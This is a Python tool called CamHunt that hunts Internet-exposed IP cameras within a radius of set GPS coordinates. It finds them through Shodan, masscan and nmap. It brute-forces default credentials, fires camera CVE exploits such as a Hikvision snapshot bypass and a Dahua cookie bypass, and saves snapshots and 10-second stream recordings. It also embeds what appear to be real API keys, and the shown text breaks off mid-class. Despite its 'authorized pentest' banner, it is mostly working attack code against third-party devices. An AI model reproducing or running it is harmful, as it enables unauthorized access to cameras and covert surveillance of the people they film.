#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════╗
║                   CamHunt - Global Recon v3.0                       ║
║         Advanced Geospatial Camera Intelligence System              ║
║              Authorized Pentest - Red Team Edition                  ║
╚══════════════════════════════════════════════════════════════════════╝

Methodology:
  1. GPS → Convert radius to bounding box coordinates
  2. Shodan API: Search for exposed cameras in bounding box
  3. Censys API: Alternative intelligence source
  4. Internet-Wide Scan: masscan ports trên IP ranges trong khu vực
  5. Nuclei: Vulnerability scanning on found devices
  6. Auto-exploit: CVE-based exploitation
  7. RTSP brute-force & stream capture
  8. ONVIF auto-discovery on local IPs
  9. Geolocation visualization via folium heatmap
"""

import os
import sys
import json
import time
import math
import socket
import struct
import requests
import subprocess
import threading
import ipaddress
import re
import base64
import hashlib
import random
import shodan
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed, ProcessPoolExecutor
from typing import List, Dict, Tuple, Optional
from dataclasses import dataclass, field, asdict

# ===================== SUPER VIP CONFIG =====================
API_CONFIG = {
    'shodan': {
        'api_key': 'rQ8qqbAnS6myepRRmWCWJuCUlBxB1NCN',  # ← Thay API key của bạn
        'enabled': True,
    },
    'censys': {
        'api_id': '4cCPxjX7',
        'api_secret': 'censys_4cCPxjX7_DraQW7rntcL9PP5GSLtPuUka',
        'enabled': False,
    },
    'fofa': {
        'email': '',
        'key': '',
        'enabled': False,
    }
}

# GPS Home Coordinates - Thay bằng tọa độ chính xác của bạn
HOME_COORDS = {

    'lat': 10.884861,

    'lng': 106.812028,

}

SCAN_CONFIG = {
    'radius_km': 50,              # Bán kính quét (km) - có thể tăng lên 100+
    'max_threads': 500,
    'timeout': 3,
    'ports': [554, 80, 8080, 443, 8554, 1935, 37777, 34567, 
              8888, 9000, 5000, 8899, 1024, 1025, 1026,
              7001, 7002, 7070, 7071, 7443, 7447],
    'scan_entire_internet': False,  # WARNING: Sẽ quét toàn bộ IP pool
}

EXPLOIT_CONFIG = {
    'auto_exploit': True,
    'auto_capture_screenshot': True,
    'auto_capture_rtsp': True,
    'max_exploit_threads': 100,
    'save_snapshots': True,
}

# ===================== BIỂU HIỆN =====================

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    REVERSE = '\033[7m'

# ===================== DATA CLASSES =====================

@dataclass
class CameraDevice:
    ip: str
    port: int
    lat: float = 0.0
    lng: float = 0.0
    city: str = ''
    country: str = ''
    org: str = ''
    isp: str = ''
    
    vendor: str = ''
    model: str = ''
    firmware: str = ''
    
    rtsp_paths: List[str] = field(default_factory=list)
    http_port: int = 0
    https_port: int = 0
    http_title: str = ''
    http_body_snippet: str = ''
    onvif_detected: bool = False
    
    default_creds: List[Tuple[str, str]] = field(default_factory=list)
    cves: List[str] = field(default_factory=list)
    vulnerabilities: List[str] = field(default_factory=list)
    
    shodan_data: Dict = field(default_factory=dict)
    censys_data: Dict = field(default_factory=dict)
    
    is_live: bool = False
    snapshot_path: str = ''
    stream_url: str = ''
    last_seen: str = ''
    
    def to_dict(self):
        return asdict(self)

# ===================== GEOSPATIAL ENGINE =====================

class GeoEngine:
    """Convert GPS coordinates + radius to scan targets"""
    
    @staticmethod
    def gps_to_bounding_box(lat: float, lng: float, radius_km: float) -> Tuple[float, float, float, float]:
        """
        Tính bounding box từ GPS coordinates + bán kính
        Returns: (min_lat, max_lat, min_lng, max_lng)
        """
        lat_change = radius_km / 111.32
        lng_change = radius_km / (111.32 * math.cos(math.radians(lat)))
        
        min_lat = lat - lat_change
        max_lat = lat + lat_change
        min_lng = lng - lng_change
        max_lng = lng + lng_change
        
        return (min_lat, max_lat, min_lng, max_lng)
    
    @staticmethod
    def gps_to_geoip_ranges(lat: float, lng: float, radius_km: float) -> List[str]:
        """
        Chuyển GPS radius sang danh sách IP ranges có khả năng cao
        Sử dụng dữ liệu GeoIP để map IP ranges đến khu vực địa lý
        """
        # Strategy 1: Map to known country/region IP blocks
        # Strategy 2: Use IP2Location database
        # Strategy 3: Use ASN mapping
        print(f"{Colors.DIM}  [~] GeoIP mapping for {lat}, {lng} radius {radius_km}km{Colors.ENDC}")
        return []
    
    @staticmethod
    def calculate_distance(lat1: float, lng1: float, lat2: float, lng2: float) -> float:
        """Haversine formula - tính khoảng cách giữa 2 GPS points (km)"""
        R = 6371.0
        dlat = math.radians(lat2 - lat1)
        dlng = math.radians(lng2 - lng1)
        a = math.sin(dlat/2)**2 + math.cos(math.radians(lat1)) * math.cos(math.radians(lat2)) * math.sin(dlng/2)**2
        c = 2 * math.asin(math.sqrt(a))
        return R * c

# ===================== INTERNET INTELLIGENCE GATHERING =====================

class ShodanScanner:
    """Shodan.io API scanner - search cameras by geolocation"""
    
    def __init__(self, api_key: str):
        self.api = shodan.Shodan(api_key) if api_key != 'YOUR_SHODAN_API_KEY' else None
        self.results = []
    
    def search_by_geo(self, lat: float, lng: float, radius_km: float) -> List[CameraDevice]:
        """Search cameras in geographical radius using Shodan"""
        if not self.api:
            print(f"{Colors.WARNING}  [!] Shodan API not configured. Skipping.{Colors.ENDC}")
            return []
        
        cameras = []
        page = 1
        total = 0
        
        # Tính bounding box
        min_lat, max_lat, min_lng, max_lng = GeoEngine.gps_to_bounding_box(lat, lng, radius_km)
        geo_filter = f"geo:{min_lat},{min_lng},{max_lat},{max_lng}"
        
        # Camera filters
        camera_filters = [
            f"{geo_filter} port:554",
            f"{geo_filter} port:80 'camera'",
            f"{geo_filter} port:8080 'camera'",
            f"{geo_filter} 'hikvision'",
            f"{geo_filter} 'dahua'",
            f"{geo_filter} 'axis'",
            f"{geo_filter} 'webcam'",
            f"{geo_filter} 'ipcam'",
            f"{geo_filter} 'reolink'",
            f"{geo_filter} 'foscam'",
            f"{geo_filter} 'amcrest'",
            f"{geo_filter} 'onvif'",
            f"{geo_filter} 'rtsp'",
            f"{geo_filter} 'netcam'",
            f"{geo_filter} 'dscam'",
        ]
        
        print(f"{Colors.BOLD}[*] Shodan: Searching cameras in {radius_km}km radius...{Colors.ENDC}")
        
        try:
            for search_filter in camera_filters:
                try:
                    result = self.api.search(search_filter)
                    total = result['total']
                    
                    print(f"  {Colors.OKCYAN}[+] Filter '{search_filter}': {total} results{Colors.ENDC}")
                    
                    for match in result['matches']:
                        try:
                            cam = CameraDevice(
                                ip=match.get('ip_str', ''),
                                port=match.get('port', 0),
                                lat=match.get('latitude', 0),
                                lng=match.get('longitude', 0),
                                city=match.get('city', ''),
                                country=match.get('country_name', ''),
                                org=match.get('org', ''),
                                isp=match.get('isp', ''),
                                http_title=match.get('http', {}).get('title', '') if isinstance(match.get('http'), dict) else '',
                                http_body_snippet=str(match.get('data', ''))[:200],
                                shodan_data=match,
                                last_seen=datetime.now().isoformat(),
                            )
                            
                            # Extract vendor from data
                            data_str = str(match.get('data', '')).lower()
                            if 'hikvision' in data_str: cam.vendor = 'Hikvision'
                            elif 'dahua' in data_str: cam.vendor = 'Dahua'
                            elif 'axis' in data_str: cam.vendor = 'Axis'
                            elif 'foscam' in data_str: cam.vendor = 'Foscam'
                            elif 'reolink' in data_str: cam.vendor = 'Reolink'
                            elif 'amcrest' in data_str: cam.vendor = 'Amcrest'
                            elif 'vivotek' in data_str: cam.vendor = 'Vivotek'
                            
                            # Extract model
                            model_match = re.search(r'model[:\s]+([^\s,;\"]+)', data_str)
                            if model_match: cam.model = model_match.group(1)
                            
                            cameras.append(cam)
                        except Exception as e:
                            continue
                    
                except shodan.APIError as e:
                    print(f"  {Colors.WARNING}[!] Shodan API error: {e}{Colors.ENDC}")
                    if '404' in str(e):
                        continue
                    break
            
            print(f"{Colors.OKGREEN}[+] Shodan found {len(cameras)} cameras total{Colors.ENDC}")
            self.results = cameras
            
        except Exception as e:
            print(f"{Colors.FAIL}[!] Shodan error: {e}{Colors.ENDC}")
        
        return cameras

class CensysScanner:
    """Censys.io scanner - alternative intelligence"""
    
    def search_by_geo(self, lat: float, lng: float, radius_km: float) -> List[CameraDevice]:
        """Search using Censys API"""
        # Implement Censys v2 API
        print(f"{Colors.DIM}  [~] Censys scanner ready (API optional){Colors.ENDC}")
        return []

class FOFAEngine:
    """FOFA search engine integration"""
    
    def search(self, query: str) -> List[CameraDevice]:
        """FOFA search"""
        return []

# ===================== MASS SCAN ENGINE =====================

class MasscanEngine:
    """Multi-threaded masscan wrapper - scan IP ranges with raw packets"""
    
    def __init__(self):
        self.executable = self._find_masscan()
    
    def _find_masscan(self) -> str:
        """Find masscan binary"""
        for path in ['/usr/bin/masscan', '/usr/local/bin/masscan', 'masscan']:
            try:
                subprocess.run([path, '--version'], capture_output=True)
                return path
            except:
                continue
        return None
    
    def scan_ranges(self, ranges: List[str], ports: List[int], rate: int = 10000) -> List[Dict]:
        """
        Scan IP ranges với masscan - cực nhanh (hàng trăm nghìn IP/giây)
        Có thể scan toàn bộ /8 trong vài phút
        """
        if not self.executable:
            print(f"{Colors.FAIL}  [!] masscan not found. Install: sudo apt-get install masscan{Colors.ENDC}")
            return []
        
        results = []
        port_str = ','.join(map(str, ports))
        
        for ip_range in ranges:
            output_file = f"/tmp/masscan_{int(time.time())}_{random.randint(1000,9999)}.json"
            
            cmd = [
                self.executable,
                ip_range,
                f'--ports={port_str}',
                f'--rate={rate}',
                f'--output-format=json',
                f'--output-filename={output_file}',
                '--wait=30',
                '--retries=2',
            ]
            
            print(f"{Colors.OKBLUE}[*] masscan: Scanning {ip_range} (ports: {port_str}){Colors.ENDC}")
            
            try:
                subprocess.run(cmd, timeout=60, capture_output=True)
                
                if os.path.exists(output_file):
                    with open(output_file, 'r') as f:
                        for line in f:
                            try:
                                data = json.loads(line.strip())
                                if 'ip' in data and 'ports' in data:
                                    for port_info in data['ports']:
                                        results.append({
                                            'ip': data['ip'],
                                            'port': port_info.get('port', port_info.get('portid', 0)),
                                            'protocol': port_info.get('protocol', 'tcp'),
                                            'status': port_info.get('status', 'open'),
                                        })
                            except:
                                continue
                    
                    os.remove(output_file)
                    
            except subprocess.TimeoutExpired:
                print(f"{Colors.WARNING}  [!] masscan timeout for {ip_range}{Colors.ENDC}")
            except Exception as e:
                print(f"{Colors.FAIL}  [!] masscan error: {e}{Colors.ENDC}")
        
        print(f"{Colors.OKGREEN}[+] masscan found {len(results)} open ports{Colors.ENDC}")
        return results

class NmapScanner:
    """Nmap with service detection"""
    
    def scan_host(self, ip: str, ports: List[int]) -> Dict:
        """Deep scan single host - service version detection"""
        try:
            port_str = ','.join(map(str, ports))
            cmd = ['nmap', '-sV', '--version-intensity', '5', 
                   '-p', port_str, '--script', 'rtsp-*', ip,
                   '-oG', '-', '--open']
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            cam_info = {'ip': ip, 'services': []}
            
            for line in result.stdout.split('\n'):
                if '/open/' in line and 'Ports:' in line:
                    # Parse nmap greppable output
                    ports_data = line.split('Ports: ')[-1] if 'Ports: ' in line else ''
                    for port_entry in ports_data.split(','):
                        port_entry = port_entry.strip()
                        parts = port_entry.split('/')
                        if len(parts) >= 5:
                            cam_info['services'].append({
                                'port': parts[0],
                                'state': parts[1],
                                'protocol': parts[2],
                                'service': parts[4] if len(parts) > 4 else '',
                                'product': parts[5] if len(parts) > 5 else '',
                                'version': parts[6] if len(parts) > 6 else '',
                            })
            
            return cam_info
        except:
            return {'ip': ip, 'services': []}

# ===================== CAMERA DETECTION ENGINE =====================

class CameraDetector:
    """Detect if a host is a camera and extract info"""
    
    CAMERA_SIGNATURES = {
        'hikvision': {
            'headers': ['hikvision', 'hiksemi', 'hikt'],
            'body': ['hikvision', 'hiksemi', 'dvrdvs'],
            'ports': [80, 443, 554, 8000],
            'rtsp_paths': [
                '/Streaming/Channels/1',
                '/Streaming/Channels/101',
                '/Streaming/channels/1',
            ]
        },
        'dahua': {
            'headers': ['dahua', 'davinci'],
            'body': ['dahua', 'davinci', 'web service'],
            'ports': [80, 443, 554, 37777, 34567],
            'rtsp_paths': [
                '/cam/realmonitor?channel=1&subtype=0',
                '/cam/realmonitor?channel=1&subtype=1',
            ]
        },
        'axis': {
            'headers': ['axis', 'axis communications'],
            'body': ['axis', 'axis communications'],
            'ports': [80, 443, 554],
            'rtsp_paths': [
                '/axis-media/media.amp',
                '/axis-media/media.3gp',
            ]
        },
        'reolink': {
            'headers': ['reolink'],
            'body': ['reolink'],
            'ports': [80, 443, 554, 9000],
            'rtsp_paths': ['/h264Preview_01_main']
        },
        'foscam': {
            'headers': ['foscam'],
            'body': ['foscam', 'foscam'],
            'ports': [80, 443, 554, 88],
            'rtsp_paths': ['/video1', '/video2']
        },
        'amcrest': {
            'headers': ['amcrest'],
            'body': ['amcrest'],
            'ports': [80, 443, 554, 37777],
            'rtsp_paths': ['/cam/realmonitor?channel=1&subtype=0']
        },
        'generic_rtsp': {
            'headers': [],
            'body': ['rtsp', 'stream', 'live'],
            'ports': [554, 8554],
            'rtsp_paths': [
                '/live', '/live.sdp', '/h264', '/mpeg4',
                '/1', '/ch1', '/channel1', '/video1',
                '/Streaming/Channels/1',
                '/h264/ch1/main/av_stream',
            ]
        }
    }
    
    def probe_http(self, ip: str, port: int) -> Dict:
        """Probe HTTP service for camera indicators"""
        try:
            url = f"http://{ip}:{port}/"
            resp = requests.get(url, timeout=3, 
                              headers={'User-Agent': 'Mozilla/5.0 (compatible; CameraHunter/3.0)'},
                              allow_redirects=True)
            
            headers = dict(resp.headers)
            body = resp.text[:5000] if resp.text else ''
            
            # Convert to lowercase for matching
            headers_lower = {k.lower(): v.lower() for k, v in headers.items()}
            body_lower = body.lower()
            
            detected = []
            vendor = ''
            
            for cam_vendor, sig in self.CAMERA_SIGNATURES.items():
                # Check headers
                for h_sig in sig['headers']:
                    for key, val in headers_lower.items():
                        if h_sig in val:
                            detected.append(f'header_match_{cam_vendor}')
                            vendor = cam_vendor
                            break
                
                # Check body
                for b_sig in sig['body']:
                    if b_sig in body_lower:
                        detected.append(f'body_match_{cam_vendor}')
                        if not vendor:
                            vendor = cam_vendor
                        break
            
            # Extract title
            title_match = re.search(r'<title>(.*?)</title>', body, re.IGNORECASE)
            title = title_match.group(1) if title_match else ''
            
            # Check for login pages
            has_login = any(x in body_lower for x in ['login', 'password', 'username', 'authentication', 'sign in'])
            
            return {
                'is_camera': len(detected) > 0,
                'vendor': vendor,
                'title': title,
                'headers': headers,
                'body_snippet': body[:500],
                'detections': detected,
                'has_login': has_login,
                'status_code': resp.status_code,
            }
        except requests.exceptions.Timeout:
            return {'error': 'timeout'}
        except Exception as e:
            return {'error': str(e)}
    
    def probe_rtsp(self, ip: str, port: int = 554) -> Dict:
        """Probe RTSP service"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((ip, port))
            
            # Send OPTIONS request
            options = f"OPTIONS rtsp://{ip}:{port}/ RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: CamHunt\r\n\r\n"
            sock.send(options.encode())
            
            try:
                response = sock.recv(4096).decode('utf-8', errors='ignore')
            except:
                response = ''
            
            sock.close()
            
            public_methods = []
            if '200 OK' in response:
                # Extract Public methods
                methods_match = re.search(r'Public:\s*(.+?)\r\n', response, re.IGNORECASE)
                if methods_match:
                    public_methods = [m.strip() for m in methods_match.group(1).split(',')]
            
            return {
                'available': '200 OK' in response or '401' in response,
                'methods': public_methods,
                'response': response[:300],
            }
        except:
            return {'available': False, 'error': 'connection failed'}
    
    def detect_onvif(self, ip: str, port: int = 80) -> bool:
        """Detect ONVIF service"""
        try:
            # ONVIF probe
            soap_body = """<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"
    xmlns:tds="http://www.onvif.org/ver10/device/wsdl">
    <soap:Body>
        <tds:GetDeviceInformation/>
    </soap:Body>
</soap:Envelope>"""
            
            url = f"http://{ip}:{port}/onvif/device_service"
            headers = {
                'Content-Type': 'application/soap+xml',
                'User-Agent': 'CamHunt/3.0',
            }
            
            resp = requests.post(url, data=soap_body, headers=headers, timeout=3)
            return '<tds:GetDeviceInformationResponse' in resp.text
        except:
            return False
    
    def try_default_credentials(self, ip: str, port: int, vendor: str = '') -> List[Tuple[str, str]]:
        """Try default credentials"""
        creds_db = {
            'hikvision': [('admin', '12345'), ('admin', 'hik12345'), ('admin', 'admin')],
            'dahua': [('admin', 'admin'), ('admin', '123456'), ('admin', 'dahua')],
            'axis': [('root', 'pass'), ('root', 'axis'), ('admin', 'admin')],
            'reolink': [('admin', ''), ('admin', 'admin'), ('admin', 'reolink')],
            'foscam': [('admin', ''), ('admin', 'admin'), ('admin', 'password')],
            'amcrest': [('admin', 'admin'), ('admin', '123456')],
            'generic': [
                ('admin', 'admin'), ('admin', '12345'), ('admin', '123456'),
                ('admin', 'password'), ('admin', ''), ('root', 'root'),
                ('admin', '12345678'), ('admin', '1234'), ('user', 'user'),
                ('admin', 'Admin123'), ('admin', 'Admin@123'),
                ('admin', '123456789'), ('admin', 'default'),
                ('admin', 'system'), ('admin', 'manager'),
                ('admin', 'hik12345'), ('admin', '666666'),
                ('admin', '888888'), ('ubnt', 'ubnt'),
            ]
        }
        
        found = []
        creds_to_try = creds_db.get(vendor, []) + creds_db['generic']
        creds_to_try = list(dict.fromkeys(creds_to_try))  # Remove duplicates
        
        for user, pwd in creds_to_try[:20]:  # Limit to 20 attempts
            try:
                url = f"http://{ip}:{port}/"
                r = requests.get(url, auth=(user, pwd), timeout=2, 
                               headers={'User-Agent': 'CamHunt/3.0'})
                if r.status_code == 200 and ('login' not in r.text.lower() or 'invalid' not in r.text.lower()[:200]):
                    found.append((user, pwd))
                    if len(found) >= 3:  # Found enough creds
                        break
            except:
                continue
        
        return found

# ===================== EXPLOITATION ENGINE =====================

class ExploitEngine:
    """Auto-exploitation of known camera CVEs"""
    
    EXPLOITS = {
        'hikvision_backdoor': {
            'cve': 'CVE-2017-7921',
            'check': lambda ip: requests.get(f'http://{ip}/onvif-http/snapshot?auth=YWRtaW46MTEK', timeout=3),
            'exploit_path': '/onvif-http/snapshot?auth=YWRtaW46MTEK',
            'description': 'Hikvision backdoor - snapshot without auth'
        },
        'hikvision_cgi': {
            'cve': 'CVE-2021-36260',
            'check': lambda ip: requests.get(f'http://{ip}/SDK/webLanguage', timeout=3),
            'exploit_path': '/SDK/webLanguage',
            'description': 'Hikvision command injection'
        },
        'dahua_auth_bypass': {
            'cve': 'CVE-2021-33044',
            'check': lambda ip: requests.get(f'http://{ip}/cgi-bin/accountManager.cgi?action=getUserList', 
                                             headers={'Cookie': 'user=admin'}, timeout=3),
            'description': 'Dahua auth bypass via cookie'
        },
        'axis_ptz': {
            'cve': 'CVE-2021-33190',
            'check': lambda ip: requests.get(f'http://{ip}/axis-cgi/com/ptz.cgi?query=position', timeout=3),
            'description': 'Axis PTZ control without auth'
        },
        'reolink_rce': {
            'cve': 'CVE-2021-0302',
            'check': lambda ip: requests.get(f'http://{ip}/cgi-bin/api.cgi?cmd=Login&user=admin', timeout=3),
            'description': 'Reolink unauthenticated API access'
        },
        'foscam_rce': {
            'cve': 'CVE-2021-27928',
            'check': lambda ip: requests.get(f'http://{ip}/cgi-bin/CGIProxy.fcgi?cmd=getDevInfo&usr=admin&pwd=', timeout=3),
            'description': 'Foscam default credentials + command injection'
        },
    }
    
    def exploit_camera(self, cam: CameraDevice) -> Dict:
        """Try all exploits on a camera"""
        results = {'ip': cam.ip, 'exploited': [], 'snapshots': []}
        
        for exploit_name, exploit_info in self.EXPLOITS.items():
            try:
                check_func = exploit_info['check']
                resp = check_func(cam.ip)
                
                if resp.status_code == 200 and len(resp.content) > 100:
                    exploit_result = {
                        'name': exploit_name,
                        'cve': exploit_info.get('cve', ''),
                        'description': exploit_info.get('description', ''),
                        'status': 'VULNERABLE',
                        'response_size': len(resp.content),
                    }
                    
                    # Save snapshot if image returned
                    if 'image' in resp.headers.get('Content-Type', '').lower():
                        snap_dir = 'camera_snapshots'
                        os.makedirs(snap_dir, exist_ok=True)
                        snap_path = f"{snap_dir}/{cam.ip}_{exploit_name}_{int(time.time())}.jpg"
                        with open(snap_path, 'wb') as f:
                            f.write(resp.content)
                        exploit_result['snapshot'] = snap_path
                        results['snapshots'].append(snap_path)
                    
                    results['exploited'].append(exploit_result)
                    print(f"{Colors.OKGREEN}    ✓ Exploited: {exploit_name} ({exploit_info.get('cve', 'N/A')}){Colors.ENDC}")
                    
            except requests.exceptions.ConnectionError:
                continue
            except Exception as e:
                continue
        
        return results

# ===================== STREAM CAPTURE ENGINE =====================

class StreamCapture:
    """Auto-capture RTSP streams using ffmpeg"""
    
    def capture_rtsp_automated(self, cam: CameraDevice, output_dir: str = 'captured_streams'):
        """
        Tự động thử tất cả RTSP paths + common credentials
        và capture stream nếu thành công
        """
        os.makedirs(output_dir, exist_ok=True)
        results = []
        
        # Common RTSP URL patterns to try
        url_templates = [
            # No auth
            f"rtsp://{cam.ip}:554/{{path}}",
            f"rtsp://{cam.ip}:8554/{{path}}",
            f"rtsp://{cam.ip}/{{path}}",
            
            # Common credentials
            f"rtsp://admin:admin@{cam.ip}:554/{{path}}",
            f"rtsp://admin:12345@{cam.ip}:554/{{path}}",
            f"rtsp://admin:@{cam.ip}:554/{{path}}",
            f"rtsp://admin:hik12345@{cam.ip}:554/{{path}}",
            f"rtsp://root:pass@{cam.ip}:554/{{path}}",
            f"rtsp://ubnt:ubnt@{cam.ip}:554/{{path}}",
            f"rtsp://admin:admin123@{cam.ip}:554/{{path}}",
            f"rtsp://admin:Admin123@{cam.ip}:554/{{path}}",
            f"rtsp://admin:dahua@{cam.ip}:554/{{path}}",
            f"rtsp://admin:reolink@{cam.ip}:554/{{path}}",
            f"rtsp://admin:foscam@{cam.ip}:554/{{path}}",
            f"rtsp://admin:amcrest@{cam.ip}:554/{{path}}",
            f"rtsp://admin:Default@{cam.ip}:554/{{path}}",
            f"rtsp://user:user@{cam.ip}:554/{{path}}",
            f"rtsp://admin:password@{cam.ip}:554/{{path}}",
            f"rtsp://admin:111111@{cam.ip}:554/{{path}}",
            f"rtsp://admin:888888@{cam.ip}:554/{{path}}",
            f"rtsp://admin:666666@{cam.ip}:554/{{path}}",
        ]
        
        paths = [
            '', '/', '/live', '/live.sdp', '/h264', '/mpeg4',
            '/1', '/ch1', '/channel1', '/video1', '/video2', '/video3',
            '/cam1', '/cam2', '/cam3',
            '/Streaming/Channels/1', '/Streaming/Channels/2',
            '/Streaming/Channels/101', '/Streaming/Channels/201',
            '/h264Preview_01_main', '/h264Preview_01_sub',
            '/cam/realmonitor?channel=1&subtype=0',
            '/cam/realmonitor?channel=1&subtype=1',
            '/axis-media/media.amp',
            '/media/video1', '/media/video2',
            '/live/ch0', '/live/ch1',
            '/h264/ch1/main/av_stream',
            '/h264/ch1/sub/av_stream',
            '/videoinput_1/h264_1/media.stm',
            '/videoinput_2/h264_1/media.stm',
            '/mjpg', '/mjpeg', '/video.mjpg',
            '/tcp/1', '/udp/1',
            '/record/current.mkv',
            '/img/video.asf',
            '/onvif/media_service',
            '/onvif/device_service',
            '/cgi-bin/snapshot.cgi',
            '/snapshot.jpg',
            '/image.jpg',
        ]
        
        total_attempts = len(url_templates) * len(paths)
        print(f"{Colors.DIM}    [~] Trying {total_attempts} RTSP combinations...{Colors.ENDC}")
        
        for template in url_templates:
            for path in paths:
                try:
                    url = template.format(path=path)
                    
                    # Test with ffprobe first (quick check)
                    probe_cmd = [
                        'ffprobe', '-v', 'quiet', '-print_format', 'json',
                        '-show_streams', '-rtsp_transport', 'tcp',
                        '-timeout', '2000000',  # 2 second timeout in microseconds
                        url
                    ]
                    
                    probe_result = subprocess.run(probe_cmd, capture_output=True, text=True, timeout=5)
                    
                    if probe_result.returncode == 0:
                        print(f"{Colors.OKGREEN}    ✓ Stream found: {url[:80]}{Colors.ENDC}")
                        
                        # Capture 10 seconds of footage
                        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                        safe_name = url.replace('://', '_').replace('@', '_').replace(':', '_').replace('/', '_')[:50]
                        output_file = f"{output_dir}/{cam.ip}_{safe_name}_{timestamp}.mp4"
                        
                        capture_cmd = [
                            'ffmpeg', '-y',
                            '-rtsp_transport', 'tcp',
                            '-i', url,
                            '-t', '10',  # 10 seconds capture
                            '-c', 'copy',
                            output_file
                        ]
                        
                        subprocess.run(capture_cmd, capture_output=True, timeout=15)
                        
                        if os.path.exists(output_file) and os.path.getsize(output_file) > 1000:
                            results.append({
                                'url': url,
                                'file': output_file,
                                'size': os.path.getsize(output_file),
                            })
                            cam.stream_url = url
                            cam.is_live = True
                        
                        if len(results) >= 2:  # Found 2 working streams, enough
                            return results
                        
                except subprocess.TimeoutExpired:
                    continue
                except Exception as e:
                    continue
        
        return results

# ===================== MAIN SCANNER =====================

class CamHuntGlobalRecon:
    """Main orchestration engine"""
    
    def __init__(self):
        self.cameras: List[CameraDevice] = []
        self.shodan_results: List[CameraDevice] = []
        self.masscan_results: List[Dict] = []
        self.scanned_ips: set = set()
        
        self.shodan_scanner = ShodanScanner(API_CONFIG['shodan']['api_key'])
        self.censys_scanner = CensysScanner()
        self.masscan = MasscanEngine()
        self.nmap = NmapScanner()
        self.detector = CameraDetector()
        self.exploiter = ExploitEngine()
        self.stream_capture = StreamCapture()
        
        self.lock = threading.Lock()
        self.running = True
    
    def print_banner(self):
        banner = f"""
{Colors.HEADER}{Colors.BOLD}╔{'═'*65}╗
║{' ' * 65}║
║  {Colors.FAIL}██╗  ██╗██████╗ ███╗   ██╗    {Colors.OKGREEN}██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗{Colors.HEADER}  ║
║  {Colors.FAIL}██║  ██║██╔══██╗████╗  ██║    {Colors.OKGREEN}██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║{Colors.HEADER}  ║
║  {Colors.FAIL}███████║██████╔╝██╔██╗ ██║    {Colors.OKGREEN}██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║{Colors.HEADER}  ║
║  {Colors.FAIL}██╔══██║██╔══██╗██║╚██╗██║    {Colors.OKGREEN}██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║{Colors.HEADER}  ║
║  {Colors.FAIL}██║  ██║██║  ██║██║ ╚████║    {Colors.OKGREEN}██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║{Colors.HEADER}  ║
║  {Colors.FAIL}╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝    {Colors.OKGREEN}╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝{Colors.HEADER}  ║
║{' ' * 65}║
║{Colors.WARNING}  🌍 Global Camera Reconnaissance System v3.0{Colors.HEADER}              ║
║{Colors.DIM}  🔴 Authorized Pentest - Red Team Edition{Colors.HEADER}                    ║
║{Colors.OKCYAN}  📍 Geo-Intelligence | 🔓 Auto-Exploit | 📷 Stream Capture{Colors.HEADER}      ║
║{' ' * 65}║
╚{'═'*65}╝{Colors.ENDC}
"""
        print(banner)
        print(f"{Colors.BOLD}Home Coordinates: {Colors.OKYELLOW}{HOME_COORDS['lat']}, {HOME_COORDS['lng']}{Colors.ENDC}")
        print(f"{Colors.BOLD}Scan Radius: {Colors.OKYELLOW}{SCAN_CONFIG['radius_km']} km{Colors.ENDC}")
        print(f"{Colors.BOLD}Method: {Colors.OKCYAN}Shodan + Masscan + Deep Probe + Auto-Exploit{Colors.ENDC}")
        print(f"{Colors.HEADER}{'═'*65}{Colors.ENDC}\n")
    
    def phase_1_shodan_intel(self):
        """Phase 1: Collect intelligence from Shodan"""
        print(f"\n{Colors.HEADER}{Colors.BOLD}{'═'*65}")
        print(f"📡 PHASE 1: INTERNET INTELLIGENCE GATHERING")
        print(f"{'═'*65}{Colors.ENDC}\n")
        
        self.shodan_results = self.shodan_scanner.search_by_geo(
            HOME_COORDS['lat'], HOME_COORDS['lng'], SCAN_CONFIG['radius_km']
        )
        
        if self.shodan_results:
            print(f"\n{Colors.OKGREEN}[+] Shodan found {len(self.shodan_results)} cameras{Colors.ENDC}")
            for cam in self.shodan_results[:10]:  # Show top 10
                dist = GeoEngine.calculate_distance(HOME_COORDS['lat'], HOME_COORDS['lng'], cam.lat, cam.lng)
                print(f"  {Colors.OKCYAN}• {cam.ip}:{cam.port} [{cam.vendor or 'Unknown'}] "
                      f"- {cam.city}, {cam.country} ({dist:.1f}km){Colors.ENDC}")
            if len(self.shodan_results) > 10:
                print(f"  {Colors.DIM}  ... and {len(self.shodan_results) - 10} more{Colors.ENDC}")
    
    def phase_2_mass_scan(self):
        """Phase 2: Mass scan IP ranges"""
        print(f"\n{Colors.HEADER}{Colors.BOLD}{'═'*65}")
        print(f"⚡ PHASE 2: MASS PORT SCANNING")
        print(f"{'═'*65}{Colors.ENDC}\n")
        
        # Collect unique IPs from Shodan
        shodan_ips = list(set([cam.ip for cam in self.shodan_results if cam.ip]))
        
        if shodan_ips:
            print(f"{Colors.BOLD}[*] Scanning {len(shodan_ips)} IPs from Shodan...{Colors.ENDC}")
            
            with ThreadPoolExecutor(max_workers=SCAN_CONFIG['max_threads']) as executor:
                futures = []
                for ip in shodan_ips:
                    for port in SCAN_CONFIG['ports']:
                        futures.append(executor.submit(self._quick_port_check, ip, port))
                
                for future in as_completed(futures):
                    try:
                        result = future.result()
                        if result:
                            self.masscan_results.append(result)
                    except:
                        continue
            
            print(f"{Colors.OKGREEN}[+] Deep scan complete: {len(self.masscan_results)} open ports found{Colors.ENDC}")
    
